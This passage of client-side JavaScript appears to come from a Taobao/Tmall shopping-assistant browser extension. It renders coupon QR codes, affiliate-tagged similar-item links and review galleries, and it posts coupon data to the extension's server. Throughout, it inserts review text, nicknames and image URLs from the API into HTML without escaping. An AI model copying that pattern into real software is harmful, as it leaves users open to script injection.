                                            } else {
                                                base64Post += `-|`
                                            }
                                        })
                                    } else {
                                        if (k || k == 0) {
                                            base64Post += `${Base64.encode(k)}|`
                                        } else {
                                            base64Post += `-|`
                                        }
                                    }
                                });
                                // console.log(postData);
                                base64Post = base64Post.replace(/\|$/gi,"");
                                if ((!sessionStorage.douyapuControl || sessionStorage.douyapuControl != infoGroup.id) && dypmyswi) {
                                    chrome.extension.sendMessage({
                                        name:"universal",
                                        url:mainUrl.storage,
                                        type:"post",
                                        dataType:"json",
                                        data:{
                                            data:base64Post,
                                            action:'cp_effec'
                                        }
                                    },function () {
                                    });
                                    sessionStorage.douyapuControl = infoGroup.id;
                                }
                            }
                        }     //优惠券入库
                        function makeQcode(e) {
                            new QRCode($('.dypAbs9527-coupon-qrImg')[0],{
                                text:'https://' + e,
                                typeNumber:2,
                                width:120,
                                height:120,
                                colorDark:"#000000",
                                colorLight:"#ffffff",
                                correctLevel:QRCode.CorrectLevel.L
                            });
                        }      //领券二维码
                        function makeScan(k,type) {
                            if (type == "no") {
                                k ? makeQcode("s.click.taobao.com/t?e=" + getParam(k.clickUrl,"e")) : makeQcode(`h5.m.taobao.com/awp/core/detail.htm?id=${infoGroup.id}`);
                            } else if (type == "has") {
                                $('.dypAbs9527-coupon-qrTitle span').html(`立减${infoGroup.amount}元`);
                                makeQcode("uland.taobao.com/coupon/edetail?e=" + getParam(k.clickUrl,"e"));
                            }
                        }   //生成外部扫一扫二维码
                    }//
                    function starGetRec() {
                        $.getJSON("https://uland.taobao.com/cp/coupon_recommend",{
                            recommendType:0,count:50,onlySimilar:0,pid:mainUrl.myMmId,itemId:infoGroup.id
                        },function (e) {
                            var html = "";
                            var swi = 1;
                            if (e && e.result && e.result.couponList) {
                                $.each(e.result.couponList,function (v,k) {
                                    var clickUrl = "https://s.click.taobao.com/t?e=" + getParam(k.item.clickUrl,"e");
                                    html += `<li>
                                        <a class="dypClear" data-url="${clickUrl}" data-douyababapaopao="工具栏+相似好货">
                                            <div class="fl dypMid9527-same-img">
                                                <img src="${k.item.picUrl}_80x80.jpg">
                                            </div>
                                            <div class="fl">
                                                <div class="dypMid9527-same-title"><i></i><span>${k.item.title}</span></div>
                                                <div class="dypMid9527-same-nPrice">券后价 : ¥${numSub(k.item.discountPrice,k.amount)} <span class="dypMid9527-same-oPrice"> ${k.item.discountPrice}</span></div>
                                                <div class="dypMid9527-same-btn"><span>领券下单 立减${k.amount}元</span><i></i></div>
                                            </div>
                                        </a>
                                    </li>`;
                                });
                                $('.dypMid9527-box-same ul').append(html);
                                $('.dypMid9527-box-same ul').on("click","a",function () {
                                    openWindow($(this).data("url"));
                                });
                                $('.dypMid9527-box-same ul').on("scroll",function () {
                                    if ($(this).scrollTop() > 500) {
                                        if (swi) {
                                            cnzzEvent("MID栏相似好货","滚动");
                                            swi = 0;
                                        }
                                    }
                                });
                            } else {
                                $(".dypMid9527-same").remove();
                            }
                        });
                    }         //查找相关优惠券
                    function startBuyShow() {
                        var requestUrl = 'https://rate.tmall.com/list_detail_rate.htm?itemId=' + infoGroup.id + '&sellerId=' + infoGroup.seller + '&order=1&append=0&content=1&tagId=&posi=&picture=1&currentPage=';
                        var totalNum;
                        var showKaiguan = 1;
                        $.ajax({
                            type:"get",
                            dataType:"html",
                            url:requestUrl + 0,
                            success:function (data) {
                                totalNum = JSON.parse(data.replace('"rateDetail":',"")).paginator ? JSON.parse(data.replace('"rateDetail":',"")).paginator.items : "error";
                                if (totalNum == "error") {
                                    $(".dypMid9527-buyers-show").remove();
                                    return;
                                }
                                if (totalNum > 999) {
                                    totalNum = "999+";
                                }
                                creatBottom(totalNum,2);
                                $("#dypMid9527 .dypMid9527-buyers-show .dypMid9527-title span").fadeOut(function () {
                                    $(this).html('买家秀<span style="color:#ff0033;font-size: 12px;font-weight: bold;margin-left:2px; ">' + totalNum + '</span>').fadeIn(1000);
                                });
                                var html = `<div id="dyp779946-fix-full" class="dyp779946-fix-full">
                                <div id="dyp779946-container-box">
                                    <div class="dyp779946-header clearfix">
                                        <div class="dyp779946-header-title"></div>
                                        <div class="dyp779946-header-num">为您找到所有买家秀共<span class="color-red">${totalNum}</span>张</div>
                                    </div>
                                    <div id="dyp779946-waterfall-box">
                                    </div>
                                </div>
                                <div id="dyp779946-detail-box">
                                </div>
                                <div class="dyp779946-close-button"></div>
                                <div class="dyp779946-scroll-top">
                                    <p class="scroll"></p>
                                    <p class="qq"></p>
                                </div>
                            </div>`;
                                if (totalNum) {
                                    //买家秀按钮点击
                                    $("#dypMid9527 .dypMid9527-buyers-show").on("click",function () {
                                        $("body").addClass("dyp779946-body-unScroll");
                                        $("#dyp779946-fix-full").css("visibility","visible");
                                        $("#dyp779946-fix-full").fadeIn();
                                    });
                                    $("body").prepend(html);
                                } else {
                                    //买家秀按钮点击
                                    var htmlTpl = `<div class="dypMid9527-no-buyers-show">暂未发现买家秀</div>`;
                                    var clickSign = 0;
                                    $("#dypMid9527 .dypMid9527-buyers-show .dypMid9527-title").append(htmlTpl);
                                    $("#dypMid9527 .dypMid9527-buyers-show").on("click",function () {
                                        if (!clickSign) {
                                            clickSign = 1;
                                            $("#dypMid9527 .dypMid9527-no-buyers-show").fadeIn(function () {
                                                setTimeout(function () {
                                                    $("#dypMid9527 .dypMid9527-no-buyers-show").fadeOut(function () {
                                                        clickSign = 0;
                                                    });
                                                },2000);
                                            });
                                        }
                                    });
                                }
                                //查看评价 点击图片增加查看所有买家秀入口
                                $("#J_TabBar").on("click","li",function () {
                                    var _mall = window.location.host.split(".")[1];
                                    var html = `<div class="dypBot9527-SeeAll-buyerShow" data-douyababapaopao="查看评价-买家秀入口"><span class="dypBot9527-SeeAllBuyerShow-icon"></span><span class="dypBot9527-SeeAllBuyerShow-title">全部买家秀(${totalNum})</span></div>`;
                                    if (_mall == "tmall") {//天猫
                                        $(document).on({
                                                'mouseenter':function () {
                                                    if ($(this).find(".dypBot9527-SeeAll-buyerShow").length == 0) {
                                                        $(this).append(html);
                                                        $(".dypBot9527-SeeAll-buyerShow").on("click",function () {
                                                            $("#dypMid9527 .dypMid9527-buyers-show").click();
                                                        })
                                                    }
                                                    $(".dypBot9527-SeeAll-buyerShow").show();
                                                },
                                                'mouseleave':function () {
                                                    $(".dypBot9527-SeeAll-buyerShow").hide();
                                                }
                                            },
                                            ".tm-m-photo-viewer")
                                    } else if (_mall == "taobao") {//淘宝
                                        $(document).on({
                                            'mouseenter':function () {
                                                if ($(this).find(".dypBot9527-SeeAll-buyerShow").length == 0) {
                                                    $(this).append(html);
                                                    $(".dypBot9527-SeeAll-buyerShow").on("click",function () {
                                                        $("#dypMid9527 .dypMid9527-buyers-show").click();
                                                    })
                                                }
                                                $(".dypBot9527-SeeAll-buyerShow").show();
                                            },
                                            'mouseleave':function () {
                                                $(".dypBot9527-SeeAll-buyerShow").hide();
                                            }
                                        },".J_ImgWrapper")
                                    }
                                });
                                var sortNum = 0;
                                $('#dyp779946-waterfall-box').waterfall({
                                    itemCls:'item',
                                    colWidth:250,
                                    gutterWidth:10,
                                    gutterHeight:10,
                                    isAutoPrefill:true,
                                    checkImagesLoaded:true,
                                    path:function (page) {
                                        return requestUrl + page;
                                    },
                                    dataType:'html',
                                    loadingMsg:'<div style="text-align:center;padding:10px 0; color:#999;"><img src="data:image/gif;base64,R0lGODlhEAALAPQAAP///zMzM+Li4tra2u7u7jk5OTMzM1hYWJubm4CAgMjIyE9PT29vb6KiooODg8vLy1JSUjc3N3Jycuvr6+Dg4Pb29mBgYOPj4/X19cXFxbOzs9XV1fHx8TMzMzMzMzMzMyH5BAkLAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAALAAAFLSAgjmRpnqSgCuLKAq5AEIM4zDVw03ve27ifDgfkEYe04kDIDC5zrtYKRa2WQgAh+QQJCwAAACwAAAAAEAALAAAFJGBhGAVgnqhpHIeRvsDawqns0qeN5+y967tYLyicBYE7EYkYAgAh+QQJCwAAACwAAAAAEAALAAAFNiAgjothLOOIJAkiGgxjpGKiKMkbz7SN6zIawJcDwIK9W/HISxGBzdHTuBNOmcJVCyoUlk7CEAAh+QQJCwAAACwAAAAAEAALAAAFNSAgjqQIRRFUAo3jNGIkSdHqPI8Tz3V55zuaDacDyIQ+YrBH+hWPzJFzOQQaeavWi7oqnVIhACH5BAkLAAAALAAAAAAQAAsAAAUyICCOZGme1rJY5kRRk7hI0mJSVUXJtF3iOl7tltsBZsNfUegjAY3I5sgFY55KqdX1GgIAIfkECQsAAAAsAAAAABAACwAABTcgII5kaZ4kcV2EqLJipmnZhWGXaOOitm2aXQ4g7P2Ct2ER4AMul00kj5g0Al8tADY2y6C+4FIIACH5BAkLAAAALAAAAAAQAAsAAAUvICCOZGme5ERRk6iy7qpyHCVStA3gNa/7txxwlwv2isSacYUc+l4tADQGQ1mvpBAAIfkECQsAAAAsAAAAABAACwAABS8gII5kaZ7kRFGTqLLuqnIcJVK0DeA1r/u3HHCXC/aKxJpxhRz6Xi0ANAZDWa+kEAA7" alt=""><br />加载中...</div>',
                                    callbacks:{
                                        loadingStart:function ($loading) {
                                            $loading.show();
                                        },
                                        loadingFinished:function ($loading,isBeyondMaxPage) {
                                            if (!isBeyondMaxPage) {
                                                $loading.fadeOut();
                                            } else {
                                                $loading.remove();
                                            }
                                        },
                                        loadingError:function ($message) {
                                            $message.html('请稍后重试');
                                        },
                                        renderData:function (data) {
                                            var res = data.replace('"rateDetail":',"");
                                            res = JSON.parse(res).rateList ? JSON.parse(res).rateList : "error";
                                            var oli = "";
                                            if (res == "error") {
                                                return oli;
                                            }
                                            if (res && res.length == 0) {
                                                $('#dyp779946-waterfall-box').waterfall('pause',function () {
                                                });
                                                return oli;
                                            }
                                            $.each(res,function (key,value) {
                                                if (value.pics && value.pics.length > 0) {
                                                    sortNum += 1;
                                                    var thumbnailPics = '';
                                                    var addComment = '';
                                                    var addPics = '';
                                                    thumbnailPics += '<div class="thumbnail">';
                                                    $.each(value.pics,function (key,value) {
                                                        if (key == 5) {
                                                            return false;
                                                        }
                                                        thumbnailPics += `<img class="thumbnail-item" src=${value}_40x40.jpg data-num="${sortNum}" data-newnum="${key}">`;
                                                    });
                                                    thumbnailPics += '</div>';
                                                    if (value.appendComment && value.appendComment.content) {
                                                        if (value.appendComment.pics.length > 0) {
                                                            addPics += '<div class="add-comment-thumbnail">';
                                                            $.each(value.appendComment.pics,function (key,value) {
                                                                if (key == 5) {
                                                                    return false;
                                                                }
                                                                addPics += `<img class="thumbnail-item" src=${value}_40x40.jpg data-num="${sortNum}">`;
                                                            });
                                                            addPics += '</div>';
                                                        }
                                                        addComment = `<div class="add-comment">
                                                        <div class="add-comment-title">追加 评论</div>
                                                        <div class="add-comment-content">${value.appendComment.content}</div>
                                                        ${addPics}
                                                    </div>`;
                                                    }
                                                    oli += `<div class="item">
                                                    <div class="top">
                                                        <img src="${value.pics[0]}" data-num="${sortNum}" data-newnum="0" data-douyababapaopao="工具+买家秀+点击详情">
                                                    </div>
                                                    <div class="middle">
                                                        ${thumbnailPics}
                                                        <div class="comment">
                                                            <span title="${value.rateContent}">${value.rateContent}</span>
                                                        </div>
                                                        ${addComment}
                                                    </div>
                                                    <div class="bottom">
                                                        <div class="use-logo"><b class="t${value.tamllSweetLevel}"></b></div>
                                                        <div class="bottom-right">
                                                            <div class="use-name">${value.displayUserNick}</div>
                                                            <div class="model-param" title="${value.auctionSku}">${value.auctionSku}</div>
                                                        </div>
                                                    </div>
                                                </div>`;
                                                }
                                            });
                                            return oli;
                                        }
                                    }
                                });
                                $("#dyp779946-fix-full").on("click",".thumbnail-item",function () {
                                    var height = $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').height();
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').height(height);
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').attr("src",$(this).attr("src").split("_40x40.jpg")[0]);
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').data("newnum",$(this).data("newnum"));
                                    $(this).addClass("active").siblings().removeClass("active");
                                });
                                $("#dyp779946-fix-full").on("click",".top img",function () {
                                    var index = $(this).data("newnum");
                                    var num = $(this).data("num");
                                    var total = $('#dyp779946-fix-full .thumbnail img[data-num=' + $(this).data("num") + ']').length;
                                    var titleSwitch = "block";
                                    showKaiguan = 0;
                                    var detailComment = $(this).parent().parent().children(".middle").children(".comment").text();
                                    var detailAddComment = $(this).parent().parent().children(".middle").children(".add-comment").children(".add-comment-content").text();
                                    var mainPic = $(this).attr("src");
                                    if (!detailAddComment) {
                                        titleSwitch = "none";
                                    }
                                    var thumbHtml = $(this).parent().parent().children(".middle").children(".thumbnail").children("img");
                                    var newThumbHtml = "";
                                    $.each(thumbHtml,function (v,k) {
                                        var item = k.attributes.src.value.replace("_40x40.jpg","_130x130.jpg");
                                        if (k.attributes["data-newnum"].value == index) {
                                            newThumbHtml += `<div class="active"><img src=${item} data-newnum="${v}" data-num="${num}"></div>`
                                        } else {
                                            newThumbHtml += `<div class=""><img src=${item} data-newnum="${v}" data-num="${num}"></div>`
                                        }
                                    });
                                    var detailHtml = `<div class="dyp779946-header clearfix">
                                    <div class="dyp779946-header-title"></div>
                                </div>
                                    <div id="dyp779946-waterfallDetail-box">
                                    <div class="dyp779946-waterfallDetail-back">
                                        <div class="dyp779946-waterfallDetail-img">
                                            <img src="${mainPic}" alt="" data-newnum="${index}" data-num="${num}">
                                            <div class="dyp779946-waterfallDetail-title dypTrans">
                                                <p class="dypBold">初次评论</p>
                                                <p class="dypAnimate" id="dypMjxAnimate">${detailComment}</p>
                                                <p class="dypBold dyp-topMargin" style="display: ${titleSwitch}">追评</p>
                                                <p style="display: ${titleSwitch}">${detailAddComment}</p>
                                            </div>
                                        </div>
                                        <button class="l" data-douyababapaopao="工具+买家秀+详情左翻页"></button>
                                        <button class="r" data-douyababapaopao="工具+买家秀+详情右翻页"></button>
                                        <div class="dyp779946-waterfallDetail-page"><span id="dyp779946-waterfallDetail-now">${index + 1}</span>/${total}</div>
                                    </div>
                                    <div class="clearfix dyp-detail-thumb">
                                        ${newThumbHtml}
                                    </div>
                                </div>`;
                                    $("#dyp779946-detail-box").html(detailHtml);
                                    $("#dyp779946-container-box").hide();
                                    $("#dyp779946-detail-box").show();
                                    $(".dyp-detail-thumb").on("click","div",function () {
                                        $(".dyp779946-waterfallDetail-img img").attr("src",$(this).children().attr("src").split("_130x130.jpg")[0]);
                                        $(".dyp-detail-thumb").children().removeClass("active");
                                        $(this).addClass("active");
                                    });
                                });
                                $("#dyp779946-detail-box").on("click","button.r",function () {
                                    $(".dyp779946-waterfallDetail-back button").show();
                                    if ($(".dyp-detail-thumb>div.active").next().length) {
                                        $(".dyp-detail-thumb>div.active").next().click();
                                    } else {
                                        var index = $(this).parent().children(".dyp779946-waterfallDetail-img").children("img").data("num");
                                        if ($('#dyp779946-waterfall-box .top img[data-num=' + index + ']').parent().parent().next().length) {
                                            index += 1;
                                            $('#dyp779946-waterfall-box .top img[data-num=' + index + ']').click();
                                            $(".dyp-detail-thumb>div:first").click();
                                        } else {
                                            $(".dyp779946-waterfallDetail-back button.r").hide();
                                        }
                                    }
                                    $("#dyp779946-waterfallDetail-now").html($(".dyp-detail-thumb>div.active img").data("newnum") + 1)
                                });
                                $("#dyp779946-detail-box").on("click","button.l",function () {
                                    $(".dyp779946-waterfallDetail-back button").show();
                                    if ($(".dyp-detail-thumb>div.active").prev().length) {
                                        $(".dyp-detail-thumb>div.active").prev().click();
                                    } else {
                                        var index = $(this).parent().children(".dyp779946-waterfallDetail-img").children("img").data("num");
                                        if ($('#dyp779946-waterfall-box .top img[data-num=' + index + ']').parent().parent().prev().length) {
                                            index -= 1;
                                            $('#dyp779946-waterfall-box .top img[data-num=' + index + ']').click();
                                            $(".dyp-detail-thumb>div:last").click();
                                        } else {
                                            $(".dyp779946-waterfallDetail-back button.l").hide();
                                        }
                                    }
                                    $("#dyp779946-waterfallDetail-now").html($(".dyp-detail-thumb>div.active img").data("newnum") + 1)
                                });
                                $("#dyp779946-detail-box").on("mouseenter",".dyp779946-waterfallDetail-title",function () {
                                    $("#dypMjxAnimate").removeClass("dypAnimate");
                                    $(this).css({"height":"auto"});
                                    var height = $(this).css("height");
                                    $(this).css({"height":"89px"}).stop().animate({
                                        height:height
                                    },500);
                                });
                                $("#dyp779946-detail-box").on("mouseleave",".dyp779946-waterfallDetail-title",function () {
                                    $("#dypMjxAnimate").addClass("dypAnimate");
                                    $(this).stop().animate({
                                        height:"89px"
                                    },500);
                                });
                                $("#dyp779946-fix-full").on("click",".dyp779946-close-button",function () {
                                    if ($("#dyp779946-detail-box")[0].style.display == "block") {
                                        showKaiguan = 1;
                                        $("#dyp779946-container-box").show();
                                        $("#dyp779946-detail-box").hide();
                                    } else {
                                        $("#dyp779946-fix-full").fadeOut();
                                        $("body").removeClass("dyp779946-body-unScroll");
                                    }
                                });
                                $("#dyp779946-fix-full .dyp779946-scroll-top").on("click","p.scroll",function () {
                                    $("#dyp779946-fix-full").animate({
                                        'scrollTop':'0px'
                                    },300)
                                });
                                $("#dyp779946-fix-full .dyp779946-scroll-top").on("click","p.qq",function () {
                                    window.open("//shang.qq.com/wpa/qunwpa?idkey=07df4060e4b8ca7215881d58e29bdaad66177f17a11a82484c3dfa9168ebc2d2");
                                });
                                $("#dyp779946-fix-full").click(function (event) {
                                    var hos = $(event.target).closest($("#dyp779946-container-box")).length;
                                    var hos2 = $(event.target).closest($("#dyp779946-fix-full .dyp779946-scroll-top")).length;
                                    var hos3 = $(event.target).closest($("#dyp779946-fix-full .dyp779946-close-button")).length;
                                    var hos4 = $(event.target).closest($("#dyp779946-detail-box")).length;
                                    if (!hos && !hos2 && !hos3 && showKaiguan == 1) {
                                        $("#dyp779946-fix-full").fadeOut();
                                        $("body").removeClass("dyp779946-body-unScroll");
                                    } else if (!hos && !hos2 && !hos3 && !hos4 && showKaiguan == 0) {
                                        if ($(event.target)[0].tagName != "BUTTON") {
                                            showKaiguan = 1;
                                            $("#dyp779946-container-box").show();
                                            $("#dyp779946-detail-box").hide();
                                        }
                                    }
                                });
                            }
                        });
                    }       //中间(买家秀)
                    function startMustSee() {
                        setTimeout(function () {
                            var currentPage = 0;
                            var requestUrl = 'https://rate.tmall.com/list_detail_rate.htm?itemId=' + infoGroup.id + '&sellerId=' + infoGroup.seller + '&order=3&append=0&content=1&tagId=&posi=&picture=&currentPage=';
                            var AllDetail = [];
                            for (var i = 1; i < 26; i++) {
                                $.ajax({
                                    url:requestUrl + i,
                                    type:"get",
                                    dataType:"html",
                                    success:function (d) {
                                        var res = d.replace('"rateDetail":',"");
                                        res = JSON.parse(res).rateList ? JSON.parse(res).rateList : [];
                                        if (res && res.length != 0) {
                                            $.each(res,function (v,k) {
                                                AllDetail.push(k);
                                            });
                                        }
                                        currentPage += 1;
                                        start();
                                    }
                                });
                            }
                            function start() {
                                if (currentPage == 25) {
                                    $.each(AllDetail,function (key,val) {       //为每条数据增加total权值
                                        val.total = 0;
                                        if (val.appendComment) {   //追评 +5
                                            val.total += 5;
                                        }
                                        if (val.pics) {    //有图  +3
                                            val.total += 3;
                                        }
                                        if (val.rateContent.length > 24) {  //评论字数25以上 +1
                                            val.total += 1;
                                        }
                                    });
                                    AllDetail.sort(function (a,b) {  //按total权值  大小降序
                                        return b.total - a.total;
                                    });
                                    if (AllDetail.length > 30) {   //取前面30条
                                        AllDetail.length = 30;
                                    }
                                    creatBottom(AllDetail.length,3);
                                    if (window.innerWidth && window.innerWidth < 1200) {
                                        $("#dypMid9527 .dypMid9527-must-see .dypMid9527-title span").html('评价<span style="color:#ff0033;font-size: 12px;font-weight: bold;margin-left:2px; ">' + AllDetail.length + '</span>');
                                    } else {
                                        $("#dypMid9527 .dypMid9527-must-see .dypMid9527-title span").html('必看评价<span style="color:#ff0033;font-size: 12px;font-weight: bold;margin-left:2px; ">' + AllDetail.length + '</span>');
                                    }
                                    if (AllDetail.length != 0) {  //有数据=>渲染页面
                                        var content = "";
                                        $.each(AllDetail,function (k,v) {
                                            content += '<div class="dypMid9527-comments-item">';
                                            content += '<div class="dypMid9527-comments-item-padding">';
                                            content += '<div class="dypMid9527-comments-item-top">';
                                            content += '<div class="dypMid9527-cit-left">';
                                            content += '<div class="dypMid9527-cit-left-portrait">';
                                            content += '<img src="data:image/png;base64,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">';
                                            content += '</div>';
                                            content += '<div class="dypMid9527-cit-left-next">';
                                            content += '<div class="dypMid9527-cit-ln-nickname">' + v.displayUserNick + '</div>';  //昵称
                                            content += '<div class="dypMid9527-cit-ln-nickname-next">';
                                            content += '<div class="dypMid9527-cit-right-date">' + v.rateDate + '</div>';   //时间
                                            content += '</div>';
                                            content += '</div>';
                                            content += '</div>';
                                            if (v.auctionSku) {  //判断是否有购买物品种类信息 添加对应节点
                                                content += '<div class="dypMid9527-cit-right">';
                                                content += '<div class="dypMid9527-cit-right-params">' + v.auctionSku + '</div>';//物品种类信息
                                                content += '</div>';
                                            }
                                            content += '</div>';
                                            content += '<div class="dypMid9527-comments-item-comment">';
                                            content += '<div class="dypMid9527-cic-fcomment" >';
                                            content += '<div class="dypMid9527-cic-fcomment-content">';
                                            content += '<span class="dypMid9527-cic-fcomment-content-title">初次评论：</span>';
                                            content += '<span class="dypMid9527-cic-fcomment-content-text">' + v.rateContent + '</span>';//初次评论内容
                                            content += '</div>';
                                            if (v.pics) {
                                                content += '<div class="dypMid9527-cip-comment">';
                                                content += '<div class="dypMid9527-cip-comment-items">';
                                                $.each(v.pics,function (key,val) {
                                                    content += '<div class="dypMid9527-cip-comment-item zoom-in">';
                                                    content += '<img src="' + val + '">';
                                                    content += '</div>';
                                                });
                                                content += '</div>';
                                                content += '<div class="dypMid9527-cip-comment-large-mode" style="display: none;">';
                                                content += '<img class="zoom-out" src="">';
                                                content += '<div class="dypMid9527-cip-comment-img-switch-btn-left">';
                                                content += '<div class="dypMid9527-cip-comment-img-prev-btn"></div>';
                                                content += '</div> ';
                                                content += '<div class="dypMid9527-cip-comment-img-switch-btn-right" >';
                                                content += '<div class="dypMid9527-cip-comment-img-next-btn"></div>';
                                                content += '</div>';
                                                content += '</div>';
                                                content += '</div> ';
                                            }
                                            content += '</div>';
                                            if (v.appendComment) {
                                                content += '<div class="dypMid9527-cic-acomment" >';
                                                content += '<div class="dypMid9527-cic-fcomment-content">';
                                                if (v.appendComment.days == 0) {
                                                    v.appendComment.days = "当";
                                                }
                                                content += '<span class="dypMid9527-cic-fcomment-content-titles" >' + v.appendComment.days + '天后追评：</span>';
                                                content += '<span class="dypMid9527-cic-fcomment-content-text">' + v.appendComment.content + '</span>';
                                                content += '</div>';
                                                if (v.appendComment.pics) {
                                                    content += '<div class="dypMid9527-cic-acomment-pics">';
                                                    $.each(v.appendComment.pics,function (keys,vals) {
                                                        content += '<div class="dypMid9527-cip-comment-item  zoom-in">';
                                                        content += '<img src="' + vals + '">';
                                                        content += '</div>';
                                                    });
                                                    content += '</div>';
                                                    content += '<div class="dypMid9527-cip-comment-large-mode" style="display: none;">';
                                                    content += '<img class="zoom-out" src="">';
                                                    content += '<div class="dypMid9527-cip-comment-img-switch-btn-left">';
                                                    content += '<div class="dypMid9527-cip-comment-img-prev-btn"></div>';
                                                    content += '</div> ';
                                                    content += '<div class="dypMid9527-cip-comment-img-switch-btn-right" >';
                                                    content += '<div class="dypMid9527-cip-comment-img-next-btn"></div>';
                                                    content += '</div>';
                                                    content += '</div>';
                                                }
                                                content += '</div> ';
                                            }
                                            content += '</div>';
                                            content += '</div>';
                                            content += '</div>';
                                        });
                                        //创建模态框等基本结构
                                        var html = `<div class="dypMid9527-must-see-modal" style="display:none"><div class="dypMid9527-must-see-box"><div class="dypMid9527-must-see-head"><div class="dypMid9527-must-see-head-title"></div><div class="dypMid9527-must-see-head-total"><div class="dypMid9527-question-rule"><span class="dypMid9527-question-title">哪些评价值得必看</span><span class="dypMid9527-question-icon" title="查看筛选规则"></span></div><span class="arrow_1"></span><span class="arrow_2"></span><div class="dypMid9527-question-dialog"><div class="dypMid9527-question-padding"><div class="dypMid9527-question-item"><div class="dypMid9527-question-item-title" style="padding-top: 0;">如何看待有价值的评价？</div><div class="dypMid9527-question-item-desc">针对买家查看评价的习惯，对商品评价内容进行详细分析，为用户筛选出实际有效的必看内容</div></div><div class="dypMid9527-question-item"><div class="dypMid9527-question-item-desc"><div class="dypMid9527-question-item-desc-item">                                    1、理性看待差评，差评往往会被放大，参考其他晒图与追评，多角度看待问题</div><div class="dypMid9527-question-item-desc-item">                                    2、清晰晒图更有价值，更能了解商品实际情况</div><div class="dypMid9527-question-item-desc-item">                                    3、保持正确的心里预期，多维度参考评价，评价越丰富，越能说明商品特点，请相信一分价钱一分货</div><div class="dypMid9527-question-item-desc-item">                                    4、购买过程中如果实在不放心，请买运费险</div></div></div><div class="dypMid9527-question-item dypMid9527-question-item-last"><div class="dypMid9527-question-item-desc" style="padding-top: 7px;"><div class="dypMid9527-question-item-desc-item">                                    Ps: 感谢您对豆芽购物助手的支持，如果您有更好的建议，欢迎反馈给我们<a href="http://www.douyapu.com/index/feedback/" target="_blank">意见反馈</a></div></div></div></div></div></div></div><div class="dypMid9527-must-see-body"><div class="dypMid9527-must-sees-body-content">${content}</div></div><div 